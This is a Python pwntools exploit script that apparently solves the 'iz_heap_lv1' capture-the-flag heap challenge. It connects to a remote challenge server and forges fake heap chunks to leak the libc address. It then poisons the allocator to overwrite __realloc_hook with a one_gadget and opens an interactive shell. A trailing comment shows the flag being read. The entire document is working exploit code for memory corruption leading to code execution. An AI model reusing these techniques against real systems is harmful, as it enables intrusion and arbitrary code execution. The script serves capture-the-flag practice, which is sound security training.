#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.log_level = "critical"
context.binary = "./iz_heap_lv1"
elf = context.binary
# libc = elf.libc
libc = ELF("./libc.so.6")
libc.sym['main_arena'] = 0x3ebc40
libc.sym['one_gadget'] = 0x10a38c

def add(size, cont):
    io.sendlineafter("Choice: \n", "1")
    io.sendlineafter("size: ", str(size))
    io.sendafter("data: ", cont)
    sleep(0.01)

def edit(idx, size, cont):
    io.sendlineafter("Choice: \n", "2")
    io.sendlineafter("index: ", str(idx))
    io.sendlineafter("size: ", str(size))
    io.sendafter("data: ", cont)
    sleep(0.01)

def delete(idx):
    io.sendlineafter("Choice: \n", "3")
    io.sendlineafter("index: ", str(idx))

def show(yes = False, name = ''):
    io.sendlineafter("Choice: \n", "4")
    if yes:
        io.sendafter("(Y/N)", "Y")
        sleep(0.01)
        io.sendafter("name: ", name)
        sleep(0.01)
    else:
        io.sendafter("(Y/N)", "N")
        sleep(0.01)

def DEBUG():
    gdbcmd = '''
    b *0x400A9B
    c
    '''
    gdb.attach(io, gdbcmd)
    sleep(0.5)


#  io = process("./iz_heap_lv1")
io = remote("165.22.110.249", 3333)

fake_heap = fit({0x0: flat(0, 0x91),
                0x90: flat(0, 0x21),
                0xb0: flat(0, 0x21)
                }, filler = '\0')
io.sendafter("name: ", flat(0x602120, 0) + fake_heap)
sleep(0.01)

for i in xrange(7):
    add(0x80, str(i))
for i in xrange(7):
    delete(i)

delete(20)
show(True, '0' * 0x20)
libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - 96 - libc.sym['main_arena']
print("libc @ {:#x}".format(libc.address))

fake_heap = fit({0x0: flat(0, 0x71),
                0x70: flat(0, 0x21),
                0xb0: flat(0, 0x21)
                }, filler = '\0')
show(True, flat(0x602120, 0) + fake_heap)
delete(20)

show(True, flat(0x602120, 0, 0, 0x71, libc.sym['__realloc_hook']))

add(0x68, flat(libc.sym['__realloc_hook']))
add(0x68, flat(libc.sym['one_gadget'], libc.sym['__libc_realloc'] + 6))

#  DEBUG()
io.sendlineafter("Choice: \n", "1")
io.sendlineafter("size: ", str(0))

io.interactive()

'''
root@ss-singapore:~# python solve.py
libc @ 0x7f9208190000
$ cat /home/*/flag
ISITDTU{d800dab9684113a5d6c7d2c0381b48c1553068bc}$
'''